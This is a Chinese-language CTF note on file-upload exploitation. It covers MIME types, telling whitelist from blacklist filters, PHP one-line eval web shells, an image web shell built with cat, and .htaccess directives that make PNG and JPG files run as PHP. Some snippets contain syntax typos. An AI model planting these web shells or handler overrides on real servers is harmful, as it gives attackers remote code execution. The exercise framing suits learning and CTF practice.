# ctf的upload利用

`Content-Type: application/x-php` 是一个 MIME 类型。MIME（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展）是一种标准，用来表示文档、文件或字节流的性质和格式。它在互联网上用于标识文件的内容类型。

MIME 类型通常由两部分组成：`type/subtype`，例如 `text/html`、`image/jpeg` 和 `application/json`。其中：

- `type` 表示大类，如 `text`、`image`、`audio`、`video` 和 `application`。
- `subtype` 表示具体的格式，如 `html`、`plain`、`png`、`mp3` 等。

MIME 类型对大小写不敏感，但传统写法都是小写。它们在HTTP头信息中指定，告诉浏览器或其他客户端如何处理传输的数据。

有许多不同的 MIME 类型，以下是一些常见的例子：

常见的content-type可能是如下之一：

| 类型          | 描述                                                         | 典型示例                                                     |
| :------------ | :----------------------------------------------------------- | :----------------------------------------------------------- |
| `text`        | 表明文件是普通文本，理论上是人类可读                         | `text/plain`, `text/html`, `text/css, text/javascript`       |
| `image`       | 表明是某种图像。不包括视频，但是动态图（比如动态 gif）也使用 image 类型 | `image/gif`, `image/png`, `image/jpeg`, `image/bmp`, `image/webp`, `image/x-icon`, `image/vnd.microsoft.icon` |
| `audio`       | 表明是某种音频文件                                           | `audio/midi`, `audio/mpeg, audio/webm, audio/ogg, audio/wav` |
| `video`       | 表明是某种视频文件                                           | `video/webm`, `video/ogg`                                    |
| `application` | 表明是某种二进制数据                                         | `application/octet-stream`, `application/pkcs12`, `application/vnd.mspowerpoint`, `application/xhtml+xml`, `application/xml`, `application/pdf` |



1. **分析上传功能**：首先要了解目标应用程序的文件上传功能，包括它如何处理文件名、文件类型、文件内容等。这通常涉及到对HTML表单、JavaScript代码和服务器端逻辑的分析。

2. **识别安全措施**：确定应用程序使用了哪些安全措施来防止恶意文件上传。这可能包括文件类型的白名单或黑名单、文件大小限制、文件内容检查等。

3. **构造恶意文件**：根据分析结果，构造一个能够绕过安全措施的恶意文件。这可能涉及到修改文件扩展名、文件内容或MIME类型。

4. **绕过前端验证**：如果存在前端验证（如JavaScript验证），需要找到方法绕过它。这可能通过禁用JavaScript、修改客户端代码或使用代理工具（如Burp Suite）来修改网络请求。

5. **上传并执行**：上传恶意文件到服务器，并尝试执行。如果文件是一个Web Shell，可以使用工具（如蚁剑）来与之交互。

6. **获取flag**：通过执行恶意文件或利用Web Shell，获取服务器上存储的flag。

   

   #### 如何判断是白名单限制还是黑名单限制

   1. **测试上传**：尝试上传不同类型的文件，看看哪些被接受，哪些被拒绝。如果只有特定的几种类型被接受，可能是使用了白名单；如果大多数类型都被接受，只有少数特定类型被拒绝，可能是使用了黑名单。
   2. **错误消息**：注意上传失败时的错误消息。白名单策略通常会提示“只允许上传特定类型的文件”，而黑名单策略可能会说“不允许上传特定类型的文件”。
   3. **页面代码审查**：检查页面的HTML和JavaScript代码。如果代码中明确列出了允许上传的文件类型，那么很可能是白名单策略。如果代码中列出了不允许上传的文件类型，那么可能是黑名单策略。
   4. **网络流量分析**：使用网络抓包工具（如Wireshark或Burp Suite）来分析上传文件时的HTTP请求和响应。这可以帮助你理解后端如何处理上传的文件。
   5. **文档和源码**：如果有权限，查看应用程序的文档和源码也是一种有效的方法。开发者可能在文档中说明了文件上传的安全策略，或者在源码中实现了相关的逻辑。
   6. **绕过尝试**：尝试使用常见的绕过技术来上传不被允许的文件类型。如果成功，这可能揭示了后端使用的是黑名单策略。

```php
<?php
@eval($_POST['code'])
>?
```



图片马的制作

设计一个php一句话shell

```php
<php? @eval($_GET['cmd']) ?>
```

接着使用linux cat命令拼接

```
cat 1.php 1.png > shell.png
```

就可以尝试上传文件，访问图片并且构造`url ?shell.png=ls`



### `.htaccess`绕过

如果服务器配置允许用户上传并使用`.htaccess`文件，那么可以通过上传特定的`.htaccess`文件来绕过文件上传限制。

以下是使用`.htaccess`文件绕过上传限制的一般步骤：

1. **创建`.htaccess`文件**：根据服务器的解析规则，你可以创建一个`.htaccess`文件，其中包含指令来改变服务器对文件的处理方式。例如，你可以使用以下内容来使得服务器将所有文件当作PHP脚本执行：

   ```apache
   <IfModule mime_module>
   SetHandler application/x-httpd-php
   </IfModule>
   ```

   或者某个文件

   ```
   <FilesMatch "tll">
   
   </FilesMatch>
   ```

   这种方法时，后面的.png或者.jpg文件能被当成php代码执行，如果想换成别的改扩展名就可以

   

   ```
   AddType application/x-httpd-php .png
   ```

   

   ```
   AddType application/x-httpd-php .jpg
   ```

2. **上传`.htaccess`文件**：将你创建的`.htaccess`文件上传到目标服务器的特定目录中。

3. **上传其他文件**：上传一个带有恶意代码的文件，但文件扩展名不在服务器的黑名单中。由于`.htaccess`文件的存在，服务器会将这个文件当作PHP脚本来解析。

4. **执行恶意代码**：通过访问你上传的文件，服务器将按照PHP脚本来执行文件内容，从而可能允许你执行服务器端的命令或脚本。

请注意，这种方法只适用于服务器配置允许`.htaccess`文件并且没有正确限制其权限时。